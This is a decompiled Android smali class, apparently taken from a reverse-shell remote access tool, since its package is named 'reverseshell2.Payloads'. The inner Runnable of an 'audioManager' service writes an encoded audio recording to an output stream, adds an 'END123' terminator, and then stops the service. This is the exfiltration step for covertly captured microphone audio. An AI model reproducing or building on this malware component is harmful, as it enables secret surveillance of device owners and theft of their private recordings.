.class Lcom/example/reverseshell2/Payloads/audioManager$6;
.super Ljava/lang/Object;
.source "audioManager.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/audioManager;->sendData(Ljava/io/File;Ljava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/Payloads/audioManager;

.field final synthetic val$encodedAudio:Ljava/lang/String;

.field final synthetic val$outputStream:Ljava/io/OutputStream;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/Payloads/audioManager;Ljava/io/OutputStream;Ljava/lang/String;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/Payloads/audioManager;

    .line 168
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/audioManager$6;->this$0:Lcom/example/reverseshell2/Payloads/audioManager;

    iput-object p2, p0, Lcom/example/reverseshell2/Payloads/audioManager$6;->val$outputStream:Ljava/io/OutputStream;

    iput-object p3, p0, Lcom/example/reverseshell2/Payloads/audioManager$6;->val$encodedAudio:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 172
    const-string v0, "UTF-8"

    :try_start_0
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/audioManager$6;->val$outputStream:Ljava/io/OutputStream;

    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/audioManager$6;->val$encodedAudio:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write([B)V

    .line 173
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/audioManager$6;->val$outputStream:Ljava/io/OutputStream;

    const-string v2, "END123\n"

    invoke-virtual {v2, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/OutputStream;->write([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 176
    goto :goto_0

    .line 174
    :catch_0
    move-exception v0

    .line 175
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 177
    .end local v0    # "e":Ljava/io/IOException;
    :goto_0
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager$6;->this$0:Lcom/example/reverseshell2/Payloads/audioManager;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/example/reverseshell2/Payloads/audioManager;->stopForeground(Z)V

    .line 178
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager$6;->this$0:Lcom/example/reverseshell2/Payloads/audioManager;

    invoke-virtual {v0}, Lcom/example/reverseshell2/Payloads/audioManager;->stopSelf()V

    .line 179
    return-void
.end method
